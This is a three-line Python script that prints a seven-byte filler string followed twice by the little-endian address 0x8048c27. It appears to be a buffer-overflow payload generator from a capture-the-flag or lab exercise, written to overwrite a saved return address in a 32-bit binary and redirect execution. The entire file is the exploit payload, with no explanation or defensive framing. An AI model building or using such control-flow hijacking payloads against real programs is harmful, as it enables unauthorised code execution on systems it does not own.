import sys
sys.stdout.buffer.write(bytes("asssbcd", 'utf-8'))
sys.stdout.buffer.write(0x8048c27.to_bytes(4, 'little'))
sys.stdout.buffer.write(0x8048c27.to_bytes(4, 'little'))